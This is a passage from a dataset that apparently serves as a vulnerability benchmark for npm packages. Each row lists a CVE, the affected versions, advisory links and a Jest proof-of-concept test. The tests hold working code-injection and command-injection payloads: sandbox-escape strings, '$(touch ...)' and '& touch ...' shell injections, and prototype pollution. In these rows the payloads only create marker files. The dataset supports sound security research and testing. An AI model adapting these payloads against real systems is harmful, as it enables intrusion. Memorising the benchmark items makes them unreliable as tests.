",https://github.com/floatinghotpot/mixin-pro/commit/8bb355209f0a082d24b04355b3e8051a6455454f,,https://security.snyk.io/vuln/npm:mixin-pro:20160407; 
code-injection,CVE-2020-7677,thenify,3.3.0,3.3.1,code-injection/thenify_3.3.0,"test(""Arbitrary code execution in thenify"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const a = require(""thenify"");
  const path = ""./thenify"";
  let payload = ""fs=require('fs');fs.writeFileSync('thenify','',)"";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    function cur() {}
    Object.defineProperty(cur, ""name"", {
      value: ""fake() {"" + payload + "";})();(function(){//"",
    });
    a(cur);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/thenables/thenify/commit/0d94a24eb933bc835d568f3009f4d269c4c4c17a,index.js:17:10,https://security.snyk.io/vuln/SNYK-JS-THENIFY-571690; 
code-injection,CVE-2020-7609,node-rules,3.0.0,5.0.0,code-injection/node-rules_3.0.0,"test(""Arbitrary code execution in node-rules"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const A = require(""node-rules"");
  const path = ""./node-rules"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    var rules = {
      condition: ""{}.__proto__.toString = 222"",
      consequence: ""require(`fs`).writeFileSync(`node-rules`,``)"",
    };
    var a = new A();
    a.fromJSON(rules);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,lib/node-rules.js:245:33,https://security.snyk.io/vuln/SNYK-JS-NODERULES-560426; https://github.com/advisories/GHSA-f78f-353m-cf4j
code-injection,CVE-2020-7777,jsen,0.6.6,,code-injection/jsen_0.6.6,"test(""Arbitrary code execution in jsen"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const jsen = require(""jsen"");
  const path = ""./jsen"";
  
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  
  let schema = JSON.parse(
    JSON.stringify({
      type: ""object"",
      properties: { username: { type: ""string"" } },
      required: [
        ""\""+clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync('touch jsen')+\""""
      ],
    })
  );
  try {
    const validate = jsen(schema);
    validate({});
  } catch (e) {}

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  
  fs.unlink(path, function (err) {});
});
",,,https://security.snyk.io/vuln/SNYK-JS-JSEN-1014670; 
code-injection,,modjs,0.4.0,,code-injection/modjs_0.4.0,"test(""Arbitrary code execution in modjs"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const sea = require(""modjs/lib/utils/sea"");
  const path = ""./modjs"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    sea.findSeajsConfig(
      ""seajs.config({a: require('fs').writeFileSync('./modjs', '')})""
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,lib/utils/sea.js:284:22,https://security.snyk.io/vuln/npm:modjs:20160407; 
code-injection,CVE-2021-23358,underscore,1.13.0-0,1.12.1,code-injection/underscore_1.13.0-0,"test(""Arbitrary code execution in underscore"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const _ = require(""underscore"");
  const path = ""./underscore"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  _.templateSettings.variable =
    ""a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)"";
  const t = _.template("""")();
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/jashkenas/underscore/commit/4c73526d43838ad6ab43a6134728776632adeb66,modules/template.js:71:14,https://github.com/advisories/GHSA-cf4h-3jhx-xvhq; 
code-injection,,mobile-icon-resizer,0.4.2,0.4.3,code-injection/mobile-icon-resizer_0.4.0,"test(""Arbitrary code execution in mobile-icon-resizer"", (done) => {
  expect.assertions(2);
  const fs = require(""fs"");
  const pathM = require(""path"");
  const resize = require(""mobile-icon-resizer"");
  const path = ""./mobile-icon-resizer"";
  
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  
  let options = {
    config: pathM.resolve(__dirname, ""./config"")
  };
  
  try {
    resize(options, function (err) {});
  } catch (e) {console.log(e)}
  
  file_exist = fs.existsSync(path);
  
  setTimeout(() => {
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
    done();
  }, 500);
});
",https://github.com/muzzley/mobile-icon-resizer/commit/a6c50f884bd282d74ab77e1fce6317d5d0dd2f0f,lib/resize.js:31:15,https://security.snyk.io/vuln/npm:mobile-icon-resizer:20160408; https://github.com/advisories/GHSA-mxjr-xmcg-fg7w
code-injection,CVE-2019-10759,safer-eval,1.3.1,1.3.4,code-injection/safer-eval_1.3.1,"test(""Arbitrary code execution in safer-eval"", () => {
  expect.assertions(2);
  const saferEval = require(""safer-eval"");
  expect({}.polluted).toBe(undefined);
  try {
    saferEval(
      ""console.constructor.constructor('return 1+(Object.prototype.polluted=`yes`)')().env""
    );
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",,lib/index.js:60:17,https://github.com/advisories/GHSA-r3x4-wr4h-pw33; https://security.snyk.io/vuln/SNYK-JS-SAFEREVAL-173772
code-injection,,kmc,1.2.2,,code-injection/kmc_1.2.2,"test(""Arbitrary code execution in kmc"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  let kmc = require(""kmc/lib"");
  const path = ""./kmc"";
  let payload = ""red(); require('fs').writeFileSync('"" + path + ""',``); //"";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  fs.writeFileSync(
    ""./exploit.js"",
    ""//{requires:[require('fs').writeFileSync('kmc','')]});""
  );
  try {
    kmc.analyze(""./exploit.js"");
  } catch (e) {}
  fs.unlinkSync(""./exploit.js"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,lib/index.js:164:43,https://security.snyk.io/vuln/npm:kmc:20160407; 
code-injection,CVE-2020-7675,cd-messenger,2.7.24,,code-injection/cd-messenger_2.7.24,"test(""Arbitrary code execution in cd-messenger"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const a = require(""cd-messenger"");
  const path = ""./cd-messenger"";
  let payload = ""red(); require('fs').writeFileSync('"" + path + ""',``); //"";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.line(payload);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,src/messenger-node.js:70:9,https://security.snyk.io/vuln/SNYK-JS-CDMESSENGER-571493; https://github.com/advisories/GHSA-v756-4whv-48vc
code-injection,,modulify,0.1.0,,code-injection/modulify_0.1.0,"test(""Arbitrary code execution in modulify"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const modulify = require(""modulify"");
  const path = ""./modulify"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    modulify.utils.getGlobals(""require(`fs`).writeFileSync(`modulify`,``)"");
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,src/modulify.js:74:5,https://security.snyk.io/vuln/npm:modulify:20160407; 
code-injection,,mongo-parse,2.1.0,,code-injection/mongo-parse_2.1.0,"test(""Arbitrary code execution in mongo-parse"", (done) => {
  expect.assertions(2);
  const fs = require(""fs"");
  const parser = require(""mongo-parse"");
  const path = ""./mongo-parse"";
  
  try {
    if (fs.existsSync(path)) fs.unlinkSync(path);
    console.log(""File removed:"", path);
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  
  try {
    let query = parser.parse(
      '} + clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync(""touch mongo-parse"") //'
    );
  } catch (error) {console.log(error)}
  
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
",,,https://security.snyk.io/vuln/npm:mongo-parse:20160408; 
code-injection,,local-devices,2.0.0,3.0.0,code-injection/local-devices_2.0.0,"test(""Arbitrary code execution in local-devices"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const find = require(""local-devices"");
  const path = ""./local-devices"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let userInput = ""127.0.0.1 | touch local-devices"";
  return find(userInput).then(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",,src/index.js:114:13,https://security.snyk.io/vuln/SNYK-JS-LOCALDEVICES-459898; https://github.com/advisories/GHSA-w725-67p7-xv22
command-injection,CVE-2018-3746,pdfinfojs,0.3.6,0.4.1,command-injection/pdfinfojs_0.3.6,"test(""Command Injection in pdfinfojs"", (done) => {
  expect.assertions(2);
  const pdfinfo = require(""pdfinfojs"");
  const fs = require(""fs"");
  const path = ""./pdfinfojs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  pdf = new pdfinfo(""$(touch pdfinfojs)"");
  pdf.getInfo(function (err, info, params) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/pdfinfo.js:47:23,https://security.snyk.io/vuln/npm:pdfinfojs:20180409; https://github.com/advisories/GHSA-3pxp-6963-46r9
command-injection,CVE-2019-10788,find-process,1.4.4,,command-injection/find-process_1.4.4,"test(""Command Injection in find-process"", () => {
  expect.assertions(1);
  const find = require(""find-process"");
  const fs = require(""fs"");
  const path = ""./find-process"";
  const command = ""$(touch find-process)"";
  return find(""pid"", command).then(
    function (list) {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    },
    function (err) {
      console.log(err.stack || err);
    }
  );
});
",https://github.com/Turistforeningen/node-im-metadata/commit/ea15dddbe0f65694bfde36b78dd488e90f246639,lib/utils.js:19:8,https://security.snyk.io/vuln/SNYK-JS-FINDPROCESS-1090284; https://github.com/advisories/GHSA-qfxv-qqvg-24pg
command-injection,CVE-2021-23374,ps-visitor,0.0.2,,command-injection/ps-visitor_0.0.2,"test(""Command Injection in ps-visitor"", () => {
  expect.assertions(2);
  const ps_visitor = require(""ps-visitor"");
  const fs = require(""fs"");
  const path = ""./ps-visitor"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return ps_visitor.kill(""$(touch ps-visitor)"").catch(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {});
  });
});
",,index.js:404:10,https://security.snyk.io/vuln/SNYK-JS-PSVISITOR-1078544; https://github.com/advisories/GHSA-v2jv-33gh-xx29
command-injection,CVE-2021-21412,@thi.ng/egf,0.3.0,0.4.0,command-injection/thi.ng-egf_0.3.0,"test(""Command Injection in @thi.ng/egf"", () => {
  expect.assertions(2);
  const egf = require(""@thi.ng/egf"");
  const fs = require(""fs"");
  const path = ""./egf"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    egf.BUILTINS.gpg(""foo"", ""bar`touch egf`"", { opts: { decrypt: true } });
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/thi-ng/umbrella/commit/88f61656e5f5cfba960013b8133186389efaf243,lib/index.js:157:29,https://security.snyk.io/vuln/SNYK-JS-THINGEGF-1089810; https://github.com/advisories/GHSA-rj44-gpjc-29r7
command-injection,CVE-2020-28494,total.js,3.4.6,3.4.7,command-injection/total.js_3.4.6,"test(""Command Injection in total.js"", (done) => {
  expect.assertions(2);
  const total = require(""total.js"");
  const fs = require(""fs"");
  const path = ""./total_js"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let image = Image.load("""");
  let payload = "";touch total_js;"";
  var timetaken = ""Time taken by addCount function"";
  console.time(timetaken);
  image.stream(payload);
  console.timeEnd(timetaken);
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 1000);
});
",https://github.com/totaljs/framework/commit/6192491ab2631e7c1d317c221f18ea613e2c18a5,image.js:329:12,https://security.snyk.io/vuln/SNYK-JS-TOTALJS-1046672; https://github.com/advisories/GHSA-4449-hg37-77v8
command-injection,CVE-2020-7613,clamscan,1.2.0,1.3.0,command-injection/clamscan_1.2.0,"test(""Command Injection in clamscan"", () => {
  expect.assertions(2);
  const Root = require(""clamscan"");
  const fs = require(""fs"");
  const path = ""./clamscan"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var attack_code = ""touch clamscan"";
  var root = new Root();
  fs.mkdir(attack_code + ""&"", function () {});
  return root
    .init({ clamscan: { path: attack_code + ""&"" } })
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",https://github.com/kylefarris/clamscan/commit/5f557c970817fe8c578ec3f7ad3bcbcef4cf5538,index.js:495:36,https://security.snyk.io/vuln/SNYK-JS-CLAMSCAN-564113; 
command-injection,CVE-2020-7635,compass-compile,0.0.1,,command-injection/compass-compile_0.0.1,"test(""Command Injection in compass-compile"", () => {
  expect.assertions(2);
  const Root = require(""compass-compile"");
  let root = new Root();
  const fs = require(""fs"");
  const path = ""./compass-compile"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = { compassCommand: ""touch compass-compile"" };
  return root
    .compile(options)
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",,lib/compass.js:25:5,https://security.snyk.io/vuln/SNYK-JS-COMPASSCOMPILE-564429; https://github.com/advisories/GHSA-7q9f-x6rm-qmxr
command-injection,CVE-2018-16462,diskstats,0.0.2,2.0.1,command-injection/diskstats_0.0.2,"test(""Command Injection in diskstats"", (done) => {
  expect.assertions(2);
  const diskstats = require(""diskstats"");
  const fs = require(""fs"");
  const path = ""./diskstats"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  diskstats.check(""; touch diskstats"", () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlinkSync(path);
    done();
  });
});
",https://github.com/vincentmorneau/apex-publish-static-files/commit/2209af8f2b65c24aa55ab757e0e05b958c16f063,lib/stat.js:44:22,https://security.snyk.io/vuln/SNYK-JS-DISKSTATS-590099; https://github.com/advisories/GHSA-9jm3-5835-537m
command-injection,CVE-2019-10789,curling,0.2.0,1.1.0,command-injection/curling_0.2.0,"test(""Command Injection in curling"", (done) => {
  expect.assertions(2);
  const root = require(""curling"");
  const fs = require(""fs"");
  const path = ""./curling"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root.run(""& touch curling"", function (err) {
    if (err) throw err;
    else {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
      done();
    }
  });
});
",,lib/curl-transport.js:56:3,https://security.snyk.io/vuln/SNYK-JS-CURLING-546484; https://github.com/advisories/GHSA-xmxh-g7wj-8m4m
command-injection,CVE-2020-7633,apiconnect-cli-plugins,6.0.2,,command-injection/apiconnect-cli-plugins_6.0.2,"test(""Command Injection in apiconnect-cli-plugins"", () => {
  expect.assertions(2);
  const root = require(""apiconnect-cli-plugins"");
  const fs = require(""fs"");
  const path = ""./apiconnect-cli-plugins"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let payload = ""& touch apiconnect-cli-plugins &"";
  return root.pluginLoader.installPlugin(payload, """").catch(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",,lib/plugin-loader.js:181:18,https://security.snyk.io/vuln/SNYK-JS-APICONNECTCLIPLUGINS-564427; 
command-injection,CVE-2020-28425,curljs,0.1.2,,command-injection/curljs_0.1.2,"test(""Command Injection in curljs"", (done) => {
  expect.assertions(2);
  const a = require(""curljs"");
  const fs = require(""fs"");
  const path = ""./curljs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""' & touch curljs # '"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,index.js:37:12,https://security.snyk.io/vuln/SNYK-JS-CURLJS-1050404; 
command-injection,,gity,1.0.5,,command-injection/gity_1.0.5,"test(""Remote code execution in gity"", (done) => {
  expect.assertions(2);
  const Git = require(""gity"");
  const fs = require(""fs"");
  const path = ""./gity"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    let git = Git()
      .add(""*.js"")
      .commit('-m ""added js files"";touch gity;#')
      .run(() => {
        file_exist = fs.existsSync(path);
        expect(file_exist).toBe(true);
        fs.unlink(path, function (err) {
          done();
        });
      });
  } catch (error) {}
});
",,lib/index.js:90:7,https://security.snyk.io/vuln/SNYK-JS-GITY-1012730; 
command-injection,CVE-2020-8132,pdf-image,2.0.0,,command-injection/pdf-image_2.0.0,"test(""Remote code execution in pdf-image"", () => {
  expect.assertions(2);
  var PDFImage = require(""pdf-image"").PDFImage;
  const fs = require(""fs"");
  const path = ""./pdf-image_2"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    let pdfImage = new PDFImage('""; touch pdf-image_2 #""');
    return pdfImage.getInfo().finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
  } catch (error) {}
});
",,index.js:44:7,https://security.snyk.io/vuln/SNYK-JS-PDFIMAGE-551984; https://github.com/advisories/GHSA-rv7p-mmwq-x674
command-injection,CVE-2021-24033,react-dev-utils,11.0.0,11.0.4,command-injection/react-dev-utils_11.0.0,"test(""Command Injection in react-dev-utils"", () => {
  expect.assertions(2);
  const getProcessForPort = require(""react-dev-utils/getProcessForPort"");
  const fs = require(""fs"");
  const path = ""./react-dev-utils"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  getProcessForPort(""11;$(touch react-dev-utils)"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,getProcessForPort.js:28:10,https://security.snyk.io/vuln/SNYK-JS-REACTDEVUTILS-1083268; https://github.com/advisories/GHSA-5q6m-3h65-w53x
command-injection,CVE-2021-26543,git-parse,1.0.4,1.0.5,command-injection/git-parse_1.0.4,"test(""Command Injection in git-parse"", () => {
  expect.assertions(2);
  const x = require(""git-parse"");
  const fs = require(""fs"");
  const path = ""./git-parse"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  const paths = "". || touch git-parse"";
  return x.gitDiff(""."", 445454, 1545, paths).finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",,src/git_diff.js:13:3,https://security.snyk.io/vuln/SNYK-JS-GITPARSE-1290380; 
command-injection,CVE-2021-23375,psnode,0.0.1,,command-injection/psnode_0.0.1,"test(""Command Injection in psnode"", (done) => {
  expect.assertions(2);
  const psnode = require(""psnode"");
  const fs = require(""fs"");
  const path = ""./psnode"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  psnode.kill(""$(touch psnode)"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  });
});
",,lib/index.js:59:16,https://security.snyk.io/vuln/SNYK-JS-PSNODE-1078543; https://github.com/advisories/GHSA-m8fm-mv5w-33pv
command-injection,CVE-2019-10807,blamer,0.1.13,1.0.1,command-injection/blamer_0.1.13,"test(""Command Injection in blamer"", async () => {
  expect.assertions(2);
  const Root = require(""blamer"");
  const fs = require(""fs"");
  const path = ""./blamer"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_command = ""& touch blamer &"";
  root = new Root(""git"", attack_command);
  try {
    await root.blameByFile(""./"");
  } catch (err) {
  } finally {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  }
});
",https://github.com/kucherenko/blamer/commit/5fada8c9b6986ecd28942b724fa682e77ce1e11c,src/vcs/git.js:24:5,https://security.snyk.io/vuln/SNYK-JS-BLAMER-559541; https://github.com/advisories/GHSA-7vm7-j8p7-h346
command-injection,CVE-2020-7786,macfromip,1.1.1,,command-injection/macfromip_1.1.1,"test(""Command Injection in macfromip"", (done) => {
  expect.assertions(2);
  const a = require(""macfromip"");
  const fs = require(""fs"");
  const path = ""./macfromip"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a.getMacInLinux(""& touch macfromip"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/bcamarneiro/macfromip/commit/1bbed8cd6f8299ad2e9d028e0ed0771340ab8391,macfromip.js:66:15,https://security.snyk.io/vuln/SNYK-JS-MACFROMIP-1048336; https://github.com/advisories/GHSA-vh8f-xw5v-8993
command-injection,,freespace,1.0.4,,command-injection/freespace_1.0.4,"test(""Command Injection in freespace"", () => {
  expect.assertions(2);
  const freespace = require(""freespace"");
  const fs = require(""fs"");
  const path = ""./freespace"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return freespace.check(""/ ; touch freespace"").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",,index.js:51:16,https://security.snyk.io/vuln/SNYK-JS-FREESPACE-1018705; 
command-injection,CVE-2020-28434,gitblame,0.1.1,,command-injection/gitblame_0.1.1,"test(""Command Injection in gitblame"", (done) => {
  expect.assertions(2);
  const a = require(""gitblame"");
  const fs = require(""fs"");
  const path = ""./gitblame"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""& touch gitblame"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/gitblame.js:15:3,https://security.snyk.io/vuln/SNYK-JS-GITBLAME-1050430; 
command-injection,CVE-2019-10802,giting,0.0.7,0.0.8,command-injection/giting_0.0.7,"test(""Command Injection in giting"", (done) => {
  expect.assertions(2);
  const Test = require(""giting"");
  const fs = require(""fs"");
  const path = ""./giting"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let injection_command = "";touch giting;"";
  test = new Test({ workDir: ""./"" });
  repo = {
    organization: ""./"",
    name: ""./"",
    branch: injection_command,
  };
  test.pull(repo, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/MangoRaft/git/commit/9be41081f547d3dcef25e7d7c957bc2a3be2dfe0,lib/git.js:223:8,https://security.snyk.io/vuln/SNYK-JS-GITING-559008; https://github.com/advisories/GHSA-53xj-v576-3ch2
command-injection,CVE-2020-28445,npm-help,1.0.0,,command-injection/npm-help_1.0.0,"test(""Command Injection in npm-help"", () => {
  expect.assertions(2);
  const root = require(""npm-help"");
  const fs = require(""fs"");
  const path = ""./npm-help"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var module = ""& touch npm-help"";
  root.latestVersion(module);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlinkSync(""./version"");
  fs.unlink(path, function (err) {});
});
",,index.js:13:22,https://security.snyk.io/vuln/SNYK-JS-NPMHELP-1050983; 
command-injection,CVE-2014-9682,dns-sync,0.1.0,0.1.3,command-injection/dns-sync_0.1.0,"test(""Command Injection in dns-sync"", () => {
  expect.assertions(2);
  const dnsSync = require(""dns-sync"");
  const fs = require(""fs"");
  const path = ""./dns-sync"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  dnsSync.resolve(""$(touch dns-sync)"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/skoranga/node-dns-sync/commit/d9abaae384b198db1095735ad9c1c73d7b890a0d,lib/dns-sync.js:21:26,https://security.snyk.io/vuln/npm:dns-sync:20141111; https://github.com/advisories/GHSA-q5pq-pgrv-fh89
command-injection,,arpping,2.0.0,3.0.0,command-injection/arpping_2.0.0,"test(""Remote code execution in arpping"", () => {
  expect.assertions(2);
  const Arpping = require(""arpping"");
  const fs = require(""fs"");
  const path = ""./arpping"";
  let arpping = new Arpping();
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return arpping
    .ping(["";touch arpping;""])
    .then(() => {})
    .catch((err) => console.log(err))
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",https://github.com/haf-decent/arpping/commit/0db06723f8c3c73a5cc0829c667d45cba25ca44d,index.js:120:13,https://security.snyk.io/vuln/SNYK-JS-ARPPING-1060047; 
command-injection,CVE-2020-7784,ts-process-promises,1.0.2,,command-injection/ts-process-promises_1.0.2,"test(""Command Injection in ts-process-promises"", () => {
  expect.assertions(2);
  const a = require(""ts-process-promises"");
  const fs = require(""fs"");
  const path = ""./ts-process-promises"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return a.exec(""touch ts-process-promises"", {}).finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",,lib/process-promises.js:45:31,https://security.snyk.io/vuln/SNYK-JS-TSPROCESSPROMISES-1048334; https://github.com/advisories/GHSA-ww4j-c2rq-47q8
command-injection,CVE-2020-7630,git-add-remote,1.0.0,,command-injection/git-add-remote_1.0.0,"test(""Command Injection in git-add-remote"", (done) => {
  expect.assertions(2);
  const root = require(""git-add-remote"")();
  const fs = require(""fs"");
  const path = ""./git-add-remote"";
  let payload = ""& touch git-add-remote"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root(payload, """", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
